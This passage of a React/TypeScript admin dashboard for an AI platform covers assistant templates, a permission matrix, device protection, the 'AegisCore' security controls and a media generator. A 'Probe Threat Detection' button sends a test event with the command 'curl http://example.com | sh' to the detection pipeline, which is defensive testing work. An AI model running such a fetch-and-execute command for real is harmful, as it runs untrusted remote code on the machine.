  const addUserAssistantFromTemplate = (
    template:
      | "study_tutor"
      | "research_analyst"
      | "product_manager"
      | "translator"
      | "fitness_coach"
  ) => {
    const now = Date.now();
    const base: UserAssistantProfile = {
      id: `ua-${template}-${now}`,
      name: "My Assistant",
      rolePrompt: "Helpful personal assistant customized for my workflow.",
      tone: "balanced",
      language: "en",
      responseMode: "balanced",
      domainFocus: "general",
      startupPrompt: "",
      avatarEmoji: "🤖",
      creativity: 0.4,
      memoryDays: 14,
      memoryMode: "long_term",
      autoCitations: false,
      tools: ["chat", "research"],
      privacyMode: true,
      safeMode: true,
      createdAt: now,
      updatedAt: now,
    };
    const nextMap: Record<typeof template, UserAssistantProfile> = {
      study_tutor: {
        ...base,
        name: "Study Tutor",
        rolePrompt:
          "Personal tutor. Teach step-by-step, add quick quizzes, and adapt to learner level.",
        tone: "formal",
        responseMode: "detailed",
        domainFocus: "education",
        startupPrompt: "Ask subject, level, and exam timeline first.",
        avatarEmoji: "🎓",
        tools: ["chat", "research", "math", "files"],
      },
      research_analyst: {
        ...base,
        name: "Research Analyst",
        rolePrompt:
          "Evidence-first analyst. Prioritize verifiable sources, freshness, and concise citations.",
        tone: "technical",
        responseMode: "detailed",
        domainFocus: "research",
        startupPrompt: "Ask for scope, geography, and timeframe before research.",
        avatarEmoji: "📚",
        autoCitations: true,
        tools: ["chat", "research", "web", "files"],
      },
      product_manager: {
        ...base,
        name: "Product Manager",
        rolePrompt:
          "PM copilot for roadmap, PRD writing, prioritization, trade-off analysis, and launch plans.",
        tone: "balanced",
        responseMode: "balanced",
        domainFocus: "product",
        startupPrompt: "Ask for target users, KPI, and constraints before recommendations.",
        avatarEmoji: "🧭",
        tools: ["chat", "research", "code"],
      },
      translator: {
        ...base,
        name: "Global Translator",
        rolePrompt:
          "Translate with cultural nuance and preserve domain meaning. Offer literal and natural variants.",
        tone: "casual",
        responseMode: "balanced",
        domainFocus: "language",
        startupPrompt: "Ask source language, target language, and audience.",
        avatarEmoji: "🌍",
        tools: ["chat"],
      },
      fitness_coach: {
        ...base,
        name: "Fitness Coach",
        rolePrompt:
          "Fitness coach for routines, diet basics, and consistency plans. Stay safe and non-medical.",
        tone: "casual",
        responseMode: "balanced",
        domainFocus: "health_fitness",
        startupPrompt: "Ask current activity level, goals, and available equipment.",
        avatarEmoji: "💪",
        tools: ["chat", "files"],
      },
    };
    const next = nextMap[template];
    setUserAssistants((prev) => [next, ...prev]);
    setSelectedUserAssistantId(next.id);
    addNotification({ type: "success", message: `${next.name} template added.` });
  };

  const addDepartment = async () => {
    const name = newDepartmentName.trim();
    const members = Number(newDepartmentMembers);
    const tokens = Number(newDepartmentTokens);
    if (!name || !Number.isFinite(members) || members <= 0 || !Number.isFinite(tokens) || tokens <= 0) {
      addNotification({ type: "error", message: "Enter a valid department, members, and token budget." });
      return;
    }
    await callAction("/admin/dashboard/enterprise/departments/upsert", {
      department: { name, members, tokensPerMonth: tokens },
    });
    setNewDepartmentName("");
    setNewDepartmentMembers("5");
    setNewDepartmentTokens("50000");
    addNotification({ type: "success", message: "Department added." });
  };

  const applyRolePermissionAction = async (
    role: string,
    permissionId: string,
    action: "allow" | "suspend" | "revoke"
  ) => {
    const data = await callAction("/admin/dashboard/access/role-action", { role, permissionId, action });
    if (data?.success) addNotification({ type: "success", message: `Role ${role}: ${action} ${permissionId}` });
  };

  const applyUserPermissionAction = async (
    userId: string,
    permissionId: string,
    action: "allow" | "suspend" | "revoke"
  ) => {
    const data = await callAction("/admin/dashboard/access/user-action", { userId, permissionId, action });
    if (data?.success) addNotification({ type: "success", message: `User ${userId}: ${action} ${permissionId}` });
  };

  const permissionStateForRole = (role: string, permissionId: string) => {
    const entry = accessControl.rolePermissions?.[role] || {};
    if ((entry.revoke || []).includes(permissionId)) return "revoke";
    if ((entry.suspend || []).includes(permissionId)) return "suspend";
    if ((entry.allow || []).includes(permissionId)) return "allow";
    return "allow";
  };

  const permissionStateForUser = (userId: string, permissionId: string) => {
    const entry = (accessControl.userOverrides || []).find((u) => String(u.userId) === String(userId));
    if (!entry) return "inherit";
    if ((entry.revoke || []).includes(permissionId)) return "revoke";
    if ((entry.suspend || []).includes(permissionId)) return "suspend";
    if ((entry.allow || []).includes(permissionId)) return "allow";
    return "inherit";
  };

  const saveDeviceProtectionPolicy = async () => {
    const data = await callAction("/admin/device-protection/policy/save", { policy: deviceProtection.policy });
    if (data?.success) addNotification({ type: "success", message: "Device protection policy saved." });
  };

  const upsertManagedDevice = async () => {
    if (!deviceDraft.id.trim() || !deviceDraft.hostname.trim()) {
      addNotification({ type: "error", message: "Enter device id and hostname." });
      return;
    }
    const data = await callAction("/admin/device-protection/devices/upsert", {
      device: {
        id: deviceDraft.id.trim(),
        hostname: deviceDraft.hostname.trim(),
        os: deviceDraft.os,
        ownerUserId: deviceDraft.ownerUserId,
        ownerOrg: deviceDraft.ownerOrg,
        companyOwned: deviceDraft.companyOwned,
        antiVirusVersion: deviceDraft.antiVirusVersion,
      },
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Device registered/updated." });
      setDeviceDraft((prev) => ({ ...prev, id: "", hostname: "" }));
    }
  };

  const applyDeviceAction = async (id: string, action: "allow" | "suspend" | "revoke" | "quarantine") => {
    const data = await callAction("/admin/device-protection/devices/action", { id, action });
    if (data?.success) addNotification({ type: "success", message: `Device ${id}: ${action}` });
  };

  const ingestSecurityActivity = async (activity: Partial<WorkerActivityRecord>) => {
    const data = await callAction("/admin/device-protection/activity/ingest", { activity });
    if (data?.success) addNotification({ type: "info", message: `Activity ingested (${data.activity?.severity || "unknown"})` });
  };

  const runAegisAction = async (path: string, body: any = {}) => {
    try {
      const isGet = path.startsWith("GET:");
      const target = isGet ? path.replace("GET:", "") : path;
      const data = isGet ? await getJson(target) : await callAction(target, body);
      if (data) {
        setAegisOutput(data);
        if (data.deviceProtection && typeof data.deviceProtection === "object") {
          setDeviceProtection((prev) => ({ ...prev, ...data.deviceProtection }));
        }
      }
      return data;
    } catch (err: any) {
      addNotification({ type: "error", message: `Aegis action failed: ${err?.message || err}` });
      return null;
    }
  };

  const selectedAegisDeviceId = () => {
    const selected = aegisDeviceId.trim();
    if (selected) return selected;
    if (deviceDraft.id.trim()) return deviceDraft.id.trim();
    if (deviceProtection.managedDevices[0]?.id) return deviceProtection.managedDevices[0].id;
    return "";
  };

  const domainRegistryCard = (
    <Card title="Domain & Link Registry (Founder/Admin)">
      <div style={{ display: "grid", gap: 8 }}>
        <input
          value={domainLinkDraft.name}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, name: e.target.value }))}
          placeholder="Link name (e.g. Production App, User Portal, Test URL)"
          style={input}
        />
        <input
          value={domainLinkDraft.url}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, url: e.target.value }))}
          placeholder="https://your-domain.com"
          style={input}
        />
        <textarea
          value={domainLinkDraft.description}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, description: e.target.value }))}
          placeholder="Description (e.g. this is for users, this is test url, this is admin API)"
          style={{ ...input, minHeight: 70 }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <select
            value={domainLinkDraft.type}
            onChange={(e) => setDomainLinkDraft((p) => ({ ...p, type: e.target.value as DomainLink["type"] }))}
            style={input}
          >
            <option value="public">public</option>
            <option value="internal">internal</option>
            <option value="admin">admin</option>
            <option value="api">api</option>
            <option value="docs">docs</option>
            <option value="test">test</option>
          </select>
          <select
            value={domainLinkDraft.environment}
            onChange={(e) => setDomainLinkDraft((p) => ({ ...p, environment: e.target.value as DomainLink["environment"] }))}
            style={input}
          >
            <option value="development">development</option>
            <option value="staging">staging</option>
            <option value="production">production</option>
            <option value="testing">testing</option>
          </select>
          <select
            value={domainLinkDraft.audience}
            onChange={(e) => setDomainLinkDraft((p) => ({ ...p, audience: e.target.value as DomainLink["audience"] }))}
            style={input}
          >
            <option value="users">users</option>
            <option value="admins">admins</option>
            <option value="founder">founder</option>
            <option value="developers">developers</option>
            <option value="enterprise">enterprise</option>
            <option value="internal">internal</option>
          </select>
          <select
            value={domainLinkDraft.status}
            onChange={(e) => setDomainLinkDraft((p) => ({ ...p, status: e.target.value as DomainLink["status"] }))}
            style={input}
          >
            <option value="active">active</option>
            <option value="inactive">inactive</option>
            <option value="testing">testing</option>
            <option value="deprecated">deprecated</option>
          </select>
        </div>
        <input
          value={domainLinkDraft.tagsCsv}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, tagsCsv: e.target.value }))}
          placeholder="Tags (comma-separated): users, auth, test"
          style={input}
        />
        <input
          value={domainLinkDraft.owner}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, owner: e.target.value }))}
          placeholder="Owner (team or person)"
          style={input}
        />
        <input
          value={domainLinkDraft.notes}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, notes: e.target.value }))}
          placeholder="Notes (alerts, SLA, routing details)"
          style={input}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={upsertDomainLink}>
            {domainLinkDraft.id ? "Update Link" : "Add Link"}
          </button>
          <button style={chip} onClick={clearDomainLinkDraft}>Clear Form</button>
        </div>
      </div>
      <div style={{ display: "grid", gap: 8, marginTop: 10 }}>
        {domainLinks.length === 0 && <div style={muted}>No domains/links registered yet.</div>}
        {domainLinks.map((link) => (
          <div key={link.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "center" }}>
              <strong>{link.name}</strong>
              <span>{link.environment} • {link.status}</span>
            </div>
            <div style={{ marginTop: 4, wordBreak: "break-all" }}>{link.url}</div>
            <div style={{ marginTop: 4, color: "#94a3b8" }}>{link.description || "No description."}</div>
            <div style={{ marginTop: 4 }}>
              Type: {link.type} • Audience: {link.audience} • Owner: {link.owner || "n/a"}
            </div>
            <div style={{ marginTop: 4 }}>
              Tags: {(link.tags || []).join(", ") || "-"}
            </div>
            {link.notes ? <div style={{ marginTop: 4 }}>Notes: {link.notes}</div> : null}
            <div style={{ marginTop: 8, display: "flex", gap: 6, flexWrap: "wrap" }}>
              <button style={chip} onClick={() => editDomainLink(link)}>Edit</button>
              <button style={chip} onClick={() => navigator.clipboard?.writeText(link.url)}>Copy URL</button>
              <button style={chip} onClick={() => verifyDomainLink(link.id)}>Verify</button>
              <button style={chip} onClick={() => toggleDomainLink(link.id)}>
                {link.status === "active" ? "Deactivate" : "Activate"}
              </button>
              <button
                style={chip}
                onClick={() =>
                  runGuarded(
                    `domain link ${link.name}`,
                    () => callAction("/admin/dashboard/links/delete", { id: link.id }),
                    "delete"
                  )
                }
              >
                Delete
              </button>
            </div>
          </div>
        ))}
      </div>
    </Card>
  );

  const accessControlCard = (
    <Card title="Task & Permission Control Matrix">
      <div style={{ display: "grid", gap: 8 }}>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <select
            value={selectedAccessRole}
            onChange={(e) => setSelectedAccessRole(e.target.value)}
            style={input}
          >
            <option value="founder">founder</option>
            <option value="admin">admin</option>
            <option value="developer">developer</option>
            <option value="enterprise">enterprise</option>
            <option value="user">user</option>
            <option value="guest">guest</option>
          </select>
          <select
            value={selectedAccessUserId}
            onChange={(e) => setSelectedAccessUserId(e.target.value)}
            style={input}
          >
            {(users || []).map((u) => (
              <option key={u.id} value={u.id}>
                {u.name} ({u.id})
              </option>
            ))}
          </select>
          <button style={chip} onClick={async () => {
            try {
              const access = await getJson("/admin/dashboard/access/bootstrap");
              if (Array.isArray(access?.permissionCatalog)) setPermissionCatalog(access.permissionCatalog);
              if (access?.accessControl && typeof access.accessControl === "object") setAccessControl(access.accessControl);
            } catch (err: any) {
              addNotification({ type: "error", message: err?.message || "Failed to refresh access control" });
            }
          }}>Refresh</button>
        </div>
        <div style={muted}>
          Founder/Admin can set each task to <strong>allow</strong>, <strong>suspend</strong>, or <strong>revoke</strong> by role and by user.
        </div>
      </div>
      <div style={{ display: "grid", gap: 8, marginTop: 8 }}>
        {Object.entries(
          (permissionCatalog || []).reduce((acc: Record<string, PermissionCatalogItem[]>, item) => {
            const key = item.group || "general";
            if (!acc[key]) acc[key] = [];
            acc[key].push(item);
            return acc;
          }, {})
        ).map(([group, items]) => (
          <div key={group} style={log}>
            <div style={{ fontWeight: 700, marginBottom: 6, textTransform: "capitalize" }}>{group}</div>
            {items.map((item) => (
              <div key={item.id} style={{ ...row, alignItems: "center", borderBottom: "1px solid rgba(148,163,184,0.15)", paddingBottom: 6, marginBottom: 6 }}>
                <div style={{ flex: 1, minWidth: 180 }}>
                  <div style={{ fontWeight: 600 }}>{item.label}</div>
                  <div style={muted}>{item.id} • scope: {item.scope}</div>
                </div>
                <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                  <span style={muted}>Role: {permissionStateForRole(selectedAccessRole, item.id)}</span>
                  <button style={chip} onClick={() => applyRolePermissionAction(selectedAccessRole, item.id, "allow")}>Allow</button>
                  <button style={chip} onClick={() => applyRolePermissionAction(selectedAccessRole, item.id, "suspend")}>Suspend</button>
                  <button style={chip} onClick={() => applyRolePermissionAction(selectedAccessRole, item.id, "revoke")}>Revoke</button>
                </div>
                <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                  <span style={muted}>User: {permissionStateForUser(selectedAccessUserId, item.id)}</span>
                  <button style={chip} onClick={() => applyUserPermissionAction(selectedAccessUserId, item.id, "allow")}>Allow</button>
                  <button style={chip} onClick={() => applyUserPermissionAction(selectedAccessUserId, item.id, "suspend")}>Suspend</button>
                  <button style={chip} onClick={() => applyUserPermissionAction(selectedAccessUserId, item.id, "revoke")}>Revoke</button>
                </div>
              </div>
            ))}
          </div>
        ))}
        {permissionCatalog.length === 0 && <div style={muted}>No permission tasks loaded yet.</div>}
      </div>
    </Card>
  );

  const deviceProtectionCard = (
    <Card title="Device Protection & Workforce Security">
      <div style={{ display: "grid", gap: 8 }}>
        <div style={muted}>
          Protects GoldegeLabs and paid enterprise devices against misuse, malware patterns, data exfiltration, and suspicious worker activity.
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          {[
            ["enabled", "Protection Enabled"],
            ["monitorCommands", "Monitor Commands"],
            ["monitorFileChanges", "Monitor File Changes"],
            ["monitorNetworkEgress", "Monitor Network Egress"],
            ["blockUnknownExecutables", "Block Unknown Executables"],
            ["virusScanOnUpload", "Virus Scan Uploads"],
            ["dataExfiltrationShield", "Data Exfiltration Shield"],
            ["autoQuarantineOnCritical", "Auto Quarantine Critical"],
            ["enterpriseMode", "Enterprise Mode"],
          ].map(([k, label]) => (
            <button
              key={k}
              style={chip}
              onClick={() =>
                setDeviceProtection((prev) => ({
                  ...prev,
                  policy: { ...prev.policy, [k]: !Boolean((prev.policy as any)[k]) },
                }))
              }
            >
              {label}: {Boolean((deviceProtection.policy as any)[k]) ? "On" : "Off"}
            </button>
          ))}
        </div>
        <div style={{ display: "flex", gap: 8 }}>
          <input
            type="number"
            value={deviceProtection.policy.retentionDays}
            onChange={(e) =>
              setDeviceProtection((prev) => ({
                ...prev,
                policy: { ...prev.policy, retentionDays: Number(e.target.value) || 90 },
              }))
            }
            placeholder="Retention days"
            style={input}
          />
          <button style={primary} onClick={saveDeviceProtectionPolicy} disabled={!canAccessAdminOps}>
            Save Policy
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Register Managed Device</div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <input value={deviceDraft.id} onChange={(e) => setDeviceDraft((p) => ({ ...p, id: e.target.value }))} placeholder="Device ID" style={input} />
          <input value={deviceDraft.hostname} onChange={(e) => setDeviceDraft((p) => ({ ...p, hostname: e.target.value }))} placeholder="Hostname" style={input} />
          <input value={deviceDraft.os} onChange={(e) => setDeviceDraft((p) => ({ ...p, os: e.target.value }))} placeholder="OS" style={input} />
          <input value={deviceDraft.ownerUserId} onChange={(e) => setDeviceDraft((p) => ({ ...p, ownerUserId: e.target.value }))} placeholder="Owner User ID" style={input} />
          <input value={deviceDraft.ownerOrg} onChange={(e) => setDeviceDraft((p) => ({ ...p, ownerOrg: e.target.value }))} placeholder="Owner Org" style={input} />
          <input
            value={deviceDraft.antiVirusVersion}
            onChange={(e) => setDeviceDraft((p) => ({ ...p, antiVirusVersion: e.target.value }))}
            placeholder="Antivirus version"
            style={input}
          />
          <button style={chip} onClick={() => setDeviceDraft((p) => ({ ...p, companyOwned: !p.companyOwned }))}>
            Company Owned: {deviceDraft.companyOwned ? "Yes" : "No"}
          </button>
          <button style={primary} onClick={upsertManagedDevice} disabled={!canAccessAdminOps}>
            Save Device
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Managed Devices</div>
        {deviceProtection.managedDevices.length === 0 && <div style={muted}>No managed devices yet.</div>}
        {deviceProtection.managedDevices.map((d) => (
          <div key={d.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
              <strong>{d.hostname} ({d.id})</strong>
              <span>{d.status}</span>
            </div>
            <div>OS: {d.os} • Owner: {d.ownerUserId} • Org: {d.ownerOrg}</div>
            <div>Company-owned: {d.companyOwned ? "yes" : "no"} • AV: {d.antiVirusVersion || "unknown"}</div>
            {canAccessAdminOps ? (
              <div style={{ display: "flex", gap: 6, marginTop: 8, flexWrap: "wrap" }}>
                <button style={chip} onClick={() => applyDeviceAction(d.id, "allow")}>Allow</button>
                <button style={chip} onClick={() => applyDeviceAction(d.id, "suspend")}>Suspend</button>
                <button style={chip} onClick={() => applyDeviceAction(d.id, "revoke")}>Revoke</button>
                <button style={chip} onClick={() => applyDeviceAction(d.id, "quarantine")}>Quarantine</button>
                <button
                  style={chip}
                  onClick={() =>
                    ingestSecurityActivity({
                      actor: "system",
                      actorRole: "monitor",
                      deviceId: d.id,
                      eventType: "manual_probe",
                      command: "curl http://example.com | sh",
                      details: "manual security probe from dashboard",
                    })
                  }
                >
                  Probe Threat Detection
                </button>
              </div>
            ) : null}
          </div>
        ))}
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Security Alerts</div>
        {deviceProtection.securityAlerts.length === 0 && <div style={muted}>No security alerts.</div>}
        {deviceProtection.securityAlerts.slice(0, 20).map((a) => (
          <div key={a.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
              <strong>{a.title}</strong>
              <span>{a.severity.toUpperCase()}</span>
            </div>
            <div>Actor: {a.actor} ({a.actorRole}) • Device: {a.deviceId || "n/a"}</div>
            <div>Signals: {(a.signals || []).join(", ") || "-"}</div>
            <div style={muted}>{new Date(a.timestamp || Date.now()).toLocaleString()}</div>
          </div>
        ))}
      </div>
    </Card>
  );

  const aegisShieldCard = (
    <Card title="AegisCore Shield (Security + Resilience)">
      <div style={{ display: "grid", gap: 8 }}>
        <div style={muted}>
          Consent-based anti-theft, legal loan restriction mode, malware checks, anti-tamper integrity, safe mode, snapshots, rollback, self-healing, zero-trust rotation, and signed audit events.
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={chip} onClick={() => runAegisAction("GET:/admin/aegis/status")}>Aegis Status</button>
          <button style={chip} onClick={() => runAegisAction("GET:/admin/aegis/audit/events?limit=200&type=aegis.")}>Signed Audit Feed</button>
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/self-heal/run", { action: "restart_failed_services" })}
            disabled={!canAccessAdminOps}
          >
            Run Self-Heal
          </button>
          <button
            style={chip}
            onClick={() =>
              runAegisAction("/admin/aegis/safe-mode/set", {
                active: !Boolean(deviceProtection?.resilience?.safeMode?.active),
                reason: aegisSafeModeReason || "Manual security control",
              })
            }
            disabled={!canAccessAdminOps}
          >
            Safe Mode: {deviceProtection?.resilience?.safeMode?.active ? "Disable" : "Enable"}
          </button>
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/integrity/baseline", {})} disabled={!canAccessAdminOps}>Baseline Integrity</button>
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/integrity/check", {})} disabled={!canAccessAdminOps}>Integrity Check</button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Anti-Theft (Opt-in + Consent)</div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <input
            value={aegisDeviceId}
            onChange={(e) => setAegisDeviceId(e.target.value)}
            placeholder="Device ID (optional)"
            style={input}
          />
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/antitheft/flag", { deviceId: selectedAegisDeviceId(), stolen: true, consentPreGranted: true })}
            disabled={!canAccessAdminOps || !selectedAegisDeviceId()}
          >
            Flag Stolen + Lock
          </button>
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/antitheft/flag", { deviceId: selectedAegisDeviceId(), stolen: false, consentPreGranted: false })}
            disabled={!canAccessAdminOps || !selectedAegisDeviceId()}
          >
            Clear Theft Flag
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Loan Protection (Legal Restricted Mode)</div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <select value={aegisLoanStatus} onChange={(e) => setAegisLoanStatus(e.target.value as any)} style={input}>
            <option value="current">current</option>
            <option value="grace">grace</option>
            <option value="overdue">overdue</option>
            <option value="dispute">dispute</option>
          </select>
          <input
            type="number"
            value={aegisOverdueDays}
            onChange={(e) => setAegisOverdueDays(e.target.value)}
            placeholder="Overdue days"
            style={input}
          />
          <button
            style={chip}
            onClick={() =>
              runAegisAction("/admin/aegis/loan/status", {
                deviceId: selectedAegisDeviceId(),
                loanStatus: aegisLoanStatus,
                overdueDays: Number(aegisOverdueDays || 0),
              })
            }
            disabled={!canAccessAdminOps || !selectedAegisDeviceId()}
          >
            Apply Loan Status
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Malware + Prompt Injection Shield</div>
        <textarea
          value={aegisMalwareInput}
          onChange={(e) => setAegisMalwareInput(e.target.value)}
          placeholder="Paste upload content sample or suspicious script to scan..."
          style={{ ...input, minHeight: 80 }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/malware/scan", { source: "dashboard", text: aegisMalwareInput })}
            disabled={!canAccessAdminOps}
          >
            Scan Malware
          </button>
          <input
            value={aegisPromptInput}
            onChange={(e) => setAegisPromptInput(e.target.value)}
            placeholder="Prompt shield text..."
            style={input}
          />
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/prompt-shield/check", { input: aegisPromptInput })} disabled={!canAccessAdminOps}>
            Prompt Shield Check
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Snapshots, Backup, Rollback, Zero Trust</div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <input
            value={aegisSnapshotVersion}
            onChange={(e) => setAegisSnapshotVersion(e.target.value)}
            placeholder="Snapshot version (e.g. v1.0.5)"
            style={input}
          />
          <button
            style={chip}
            onClick={() =>
              runAegisAction("/admin/aegis/snapshot/create", {
                version: aegisSnapshotVersion.trim() || `v${Date.now()}`,
              })
            }
            disabled={!canAccessAdminOps}
          >
            Create Snapshot
          </button>
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/rollback", { version: aegisSnapshotVersion.trim(), reason: "manual founder rollback" })}
            disabled={!canAccessAdminOps || !aegisSnapshotVersion.trim()}
          >
            Rollback
          </button>
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button
            style={chip}
            onClick={() =>
              runAegisAction("/admin/aegis/backup/config", {
                backup: {
                  enabled: true,
                  cadence: "daily",
                  retentionDays: 30,
                  offsiteTarget: "encrypted-offsite",
                  encryptAtRest: true,
                  includeSnapshots: true,
                  includeEvents: true,
                },
              })
            }
            disabled={!canAccessAdminOps}
          >
            Save Backup Policy
          </button>
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/backup/run", { mode: "incremental" })} disabled={!canAccessAdminOps}>Run Backup</button>
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/zero-trust/rotate-keys", {})} disabled={dashboardRole !== "founder"}>
            Rotate Internal Keys (Founder)
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <input
            value={aegisSafeModeReason}
            onChange={(e) => setAegisSafeModeReason(e.target.value)}
            placeholder="Safe mode reason"
            style={input}
          />
          <button style={chip} onClick={() => exportOutputTxt("aegis_output", aegisOutput || "No Aegis output yet.")}>Export TXT</button>
          <button style={chip} onClick={() => exportOutputWord("aegis_output", aegisOutput || "No Aegis output yet.")}>Export Word</button>
          <button style={chip} onClick={() => printOutputPdf("Aegis Output", aegisOutput || "No Aegis output yet.")}>Export PDF</button>
          <button style={chip} onClick={() => setAegisOutput(null)}>Clear Output</button>
        </div>
        <pre style={{ ...log, maxHeight: 220, overflow: "auto", whiteSpace: "pre-wrap" }}>
          {aegisOutput ? JSON.stringify(aegisOutput, null, 2) : "No Aegis output yet."}
        </pre>
      </div>
    </Card>
  );

  const creatorEngineCard = (
    <Card title="Create Media (VisionForge)">
      <div style={{ ...muted, marginBottom: 8 }}>
        AI Image/Video generation, script-to-video, thumbnails, captions, background removal, job queue, history, and downloadable artifacts.
      </div>
      <div style={{ display: "grid", gap: 8 }}>
        <input
          value={creatorPrompt}
          onChange={(e) => setCreatorPrompt(e.target.value)}
          placeholder="Prompt (image/video/thumbnail)"
          style={input}
        />
        <textarea
          value={creatorScript}
          onChange={(e) => setCreatorScript(e.target.value)}
          placeholder="Script input (for Script -> Video and Subtitles)"
          style={{ ...input, minHeight: 90 }}
        />
        <input
          value={creatorImagePath}
          onChange={(e) => setCreatorImagePath(e.target.value)}
          placeholder="Existing image path (for edit/background remove)"
          style={input}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/image", { prompt: creatorPrompt, style: "cinematic", resolution: "1024x1024", aspect_ratio: "1:1", batch: 1 })}>Generate Image</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/image/edit", { image_path: creatorImagePath, instructions: creatorPrompt || "enhance details" })}>Edit Image</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/video", { prompt: creatorPrompt, duration: 8, resolution: "1080p", aspect_ratio: "16:9" })}>Generate Video</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/script-video", { script: creatorScript || creatorPrompt, voice_style: "neutral", aspect_ratio: "16:9" })}>Script to Video</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/thumbnail", { topic: creatorPrompt || "NeuroEdge", text: creatorPrompt })}>Create Thumbnail</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/subtitles", { transcript: creatorScript || creatorPrompt })}>Generate Captions</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/background-remove", { image_path: creatorImagePath })}>Remove Background</button>
          <button style={chip} onClick={loadCreatorHistory}>Refresh History</button>
        </div>

        <div style={{ ...log, padding: 10 }}>
          <div style={{ fontWeight: 600, marginBottom: 6 }}>Render Status</div>
          <div style={{ width: "100%", height: 10, background: "rgba(148,163,184,0.25)", borderRadius: 999 }}>
            <div
              style={{
                width: `${Math.max(0, Math.min(100, Number(creatorJob?.progress || 0)))}%`,
                height: "100%",
                borderRadius: 999,
                background: "linear-gradient(90deg,#22c55e,#3b82f6)",
                transition: "width 0.25s ease",
              }}
            />
          </div>
          <div style={{ ...muted, marginTop: 6 }}>
            Job: {creatorJobId || "none"} • Status: {creatorJob?.status || (creatorBusy ? "running" : "idle")}
          </div>
          {creatorJob?.error ? <div style={{ color: "#ef4444", marginTop: 6 }}>{creatorJob.error}</div> : null}
        </div>

        <div style={{ ...log, maxHeight: 220, overflow: "auto" }}>
          <div style={{ fontWeight: 600, marginBottom: 6 }}>Latest Job Output</div>
          <pre style={{ whiteSpace: "pre-wrap", margin: 0 }}>
            {creatorJob?.result ? JSON.stringify(creatorJob.result, null, 2) : "No output yet."}
          </pre>
          <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginTop: 8 }}>
            {creatorJob?.result &&
              Object.values(creatorJob.result)
                .flatMap((v: any) => (Array.isArray(v) ? v : [v]))
                .filter((v: any) => v && typeof v === "object" && typeof v.path === "string")
                .slice(0, 8)
                .map((asset: any, idx: number) => (
                  <button
                    key={`${asset.path}-${idx}`}
                    style={chip}
                    onClick={() =>
                      window.open(`${apiBase}/creator/download?path=${encodeURIComponent(String(asset.path))}`, "_blank")
                    }
                  >
                    Download {asset.name || `asset ${idx + 1}`}
                  </button>
                ))}
          </div>
        </div>

        <div style={{ ...log, maxHeight: 220, overflow: "auto" }}>
          <div style={{ fontWeight: 600, marginBottom: 6 }}>History</div>
          {creatorHistory.length === 0 ? (
            <div style={muted}>No creator history yet.</div>
          ) : (
            creatorHistory.slice(0, 40).map((h, i) => (
              <div key={`${h?.timestamp || i}-${i}`} style={{ borderBottom: "1px solid rgba(148,163,184,0.15)", padding: "6px 0" }}>
                <strong>{String(h?.type || "event")}</strong> • {new Date(Number(h?.timestamp || Date.now()) * 1000).toLocaleString()}
